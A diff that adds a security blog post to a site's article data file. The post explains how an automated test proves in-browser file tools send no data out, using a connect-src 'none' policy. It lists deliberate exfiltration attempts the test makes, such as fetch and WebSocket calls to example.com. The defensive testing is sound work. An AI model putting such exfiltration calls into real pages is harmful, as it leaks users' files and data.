@@ -1473,6 +1473,140 @@ Because lossless cutting operates purely on binary frame boundaries and header o
       'clean-csv-transform-to-json-browser',
     ],
   },
+  {
+    slug: 'we-tried-to-make-our-own-site-leak-your-file',
+    title:
+      'We Tried to Make Our Own Site Leak Your File: The Executable Egress Proof',
+    metaDescription:
+      'How we test that files never leave your browser tab: Content Security Policy connect-src none, 5 refused exfiltration vectors, and an automated non-vacuous egress test suite.',
+    keywords: [
+      'browser egress proof',
+      'content security policy connect-src none',
+      'local browser privacy verification',
+      'in-browser file processing privacy',
+      'client side file processing security',
+      'preventing browser data exfiltration',
+    ],
+    category: 'Security & Systems',
+    publishedAt: '2026-09-18',
+    readingTime: '8 min read',
+    author: 'OpenTools Security Engineering Group',
+    toolName: 'Image Compressor & Converter',
+    toolDestination: '/image/optimize',
+    summary:
+      'Most file utilities promise they delete your files after a few hours on their servers. OpenTools enforces that files never leave your device tab, backed by an executable egress test suite that runs on every release.',
+    sections: [
+      {
+        id: 'the-limits-of-promises',
+        heading: 'Why "We Delete Your Files After 8 Hours" Is Not Enough',
+        content: `Every online file converter makes a familiar assurance: *"Your files are encrypted and automatically deleted from our servers after 8 hours."*
+
+While common, that model requires complete trust in the remote infrastructure:
+- You must trust that the server's disk cleanup cron job executes reliably.
+- You must trust that intermediate cache layers and reverse proxies do not preserve unlinked request payloads.
+- You must trust that remote worker logs or crash dumps do not write file contents to cloud observability stores.
+- You must trust that the infrastructure provider's internal staff or compromised credentials cannot access temporary storage.
+
+The OpenTools architectural stance is fundamentally different: the safest way to handle your confidential documents, tax forms, and media files is to never let them reach a server in the first place. Every calculation executes in browser memory on your CPU or GPU.
+
+However, simply claiming "your files never leave your device" is just another marketing sentence unless you can inspect and execute the proof. Here is how we verify that boundary on every single release.`,
+      },
+      {
+        id: 'the-three-layer-protocol',
+        heading: 'The Three-Tier Automated Egress Protocol',
+        content: `Our automated end-to-end egress test suite (\`e2e/egress-proof.spec.ts\`) runs against the production build in both Chromium and WebKit before any release ships. The test suite measures three escalating layers of defense:
+
+### 1. Browser-Enforced Content Security Policy (CSP)
+The HTTP response header served with our tool pages restricts network primitives at the browser engine layer:
+
+\`\`\`http
+Content-Security-Policy: connect-src 'none'; default-src 'self'; form-action 'none'; object-src 'none'; base-uri 'self';
+\`\`\`
+
+The \`connect-src 'none'\` directive is the core barrier: it instructs modern browsers to block all outgoing network requests initiated via \`fetch()\`, \`XMLHttpRequest\`, \`WebSocket\`, \`EventSource\`, and \`navigator.sendBeacon()\`. Because this constraint is enforced by the host browser's sandbox rather than our application code, client-side scripts cannot bypass it.
+
+### 2. Active Exfiltration Resistance
+Observing an idle webpage proves nothing—a page that does nothing will send zero bytes simply because no code ran.
+
+To prove the security control actively works, the test suite actively executes five deliberate exfiltration attempts from inside the running page's own execution context:
+1. **Cross-Origin Fetch**: Attempting to post confidential data to an external endpoint (\`fetch('https://example.com/x', ...)\`).
+2. **Same-Origin Fetch**: Attempting to post data back to an internal endpoint on our own origin (\`fetch('/collect', ...)\`).
+3. **Cross-Origin XMLHttpRequest**: Slicing an XHR payload across origins.
+4. **WebSocket Connection**: Attempting to open a full-duplex socket stream (\`wss://example.com/s\`).
+5. **Asynchronous Beacon**: Dispatching background telemetry via \`navigator.sendBeacon()\`.
+
+In our test runs, all five attempts are actively blocked and refused by browser policy.
+
+### 3. Real Payload Execution & Zero On-the-Wire Bytes
+Finally, the suite executes a full end-to-end user workflow:
+- It synthesizes a distinct, high-entropy 86,563-byte PNG graphic directly onto a canvas element.
+- It stamps the image with a distinctive probe string (\`EGRESSPROBE-7f3a9c2b\`).
+- It transfers the synthetic file through an \`input[type=file]\` DOM trigger into our [Image Compressor & Converter](/image/optimize).
+- It initiates compression and waits for the completed file download receipt.
+
+While the operation runs, the test suite inspects every request emitted by the browser:
+- Exactly 17 same-origin requests occur—all static \`GET\` requests for pre-built JS/CSS bundles.
+- Exactly zero requests carry an HTTP body.
+- Exactly zero bytes are transferred to any off-origin host.
+- The unique probe name and image contents appear in zero request URLs.
+- Exactly zero resource timing entries record data-transmitting initiators (\`fetch\`, \`xmlhttprequest\`, \`beacon\`, or \`websocket\`).`,
+      },
+      {
+        id: 'two-critical-testing-traps',
+        heading: 'Two Measurement Traps Found in Practice',
+        content: `Building an honest egress suite revealed two deceptive browser engine behaviors:
+
+1. **\`navigator.sendBeacon()\` Return Trap**:
+   According to the W3C Beacon specification, \`navigator.sendBeacon()\` returns \`true\` if the browser successfully queues the beacon in memory—even if the page's Content Security Policy subsequently blocks transmission on the wire! Any automated test asserting that \`sendBeacon()\` returned \`false\` produces a false failure, while asserting \`true\` would record a leak as a pass. The only sound test is observing the physical network layer and Resource Timing entries directly.
+
+2. **Chromium Pre-Dispatch Request Events**:
+   When an \`XMLHttpRequest\` is blocked by CSP in Chromium, Chromium emits a \`request\` event with a failure reason of \`csp\` and zero bytes transferred. WebKit, by contrast, suppresses the event entirely. An assertion demanding that "no request event fires at all" fails in Chromium even though the browser executed the block flawlessly. Our test asserts that zero requests receive responses and zero off-origin bytes are put on the wire.`,
+      },
+      {
+        id: 'the-non-vacuous-check',
+        heading: 'The Non-Vacuous Proof: Showing the Test Can Fail',
+        content: `A test that can never fail under any circumstance proves nothing.
+
+To verify that our network sniffer is not blindly passing empty arrays, the test harness was evaluated against a negative control: a test harness page intentionally configured to load a third-party asset. The detector immediately caught the violation, logging 1 response and exactly 618 bytes transferred.
+
+This confirms that when our tools pass the egress suite with zero bytes recorded, the result reflects genuine network isolation.`,
+      },
+      {
+        id: 'what-this-does-not-claim',
+        heading: 'What This Proof Does (And Does Not) Establish',
+        content: `Clear technical communication requires stating what an experiment does **not** prove:
+
+- **It is not an absolute security guarantee**: Egress testing measures physical byte transmission on the wire. It proves where data traveled during the test run; it does not prove that software is free of arbitrary vulnerabilities or bugs.
+- **It does not monitor external extensions**: If a user has installed browser extensions with broad DOM-reading permissions, those third-party extensions operate under their own execution contexts outside the page's CSP boundaries.
+- **It applies to supported browser platforms**: The proof validates behavior in standard modern rendering engines (Chromium and WebKit).
+
+By verifying that our served policy forbids connections and that real file workflows emit zero off-origin bytes, we provide empirical evidence rather than unverifiable trust.`,
+      },
+    ],
+    faqs: [
+      {
+        question:
+          'How does connect-src none prevent files from being uploaded?',
+        answer:
+          "The browser engine's Content Security Policy enforcement blocks client-side JavaScript from opening data connections via fetch, XHR, WebSocket, or Beacon. Any attempt by scripts to send data over the network is refused by the browser itself.",
+      },
+      {
+        question: 'Are image and document conversions performed in the cloud?',
+        answer:
+          'No. All image resizing, PDF modifications, text conversions, and audio slicing run in browser memory using native Web APIs, Canvas, Web Workers, and WebAssembly.',
+      },
+      {
+        question: 'How can I verify this in my own browser devtools?',
+        answer:
+          'Open your browser Developer Tools (F12), navigate to the Network tab, and perform any tool operation on OpenTools. You will observe that no outbound HTTP POST requests or off-origin data transfers occur during processing.',
+      },
+    ],
+    relatedSlugs: [
+      'what-lossless-mp3-cutting-actually-means',
+      'how-to-convert-json-to-zod-schema-offline',
+      'optimize-images-browser-webp-converter',
+    ],
+  },
 ];
 
 export function getAllBlogPosts(): readonly BlogPost[] {
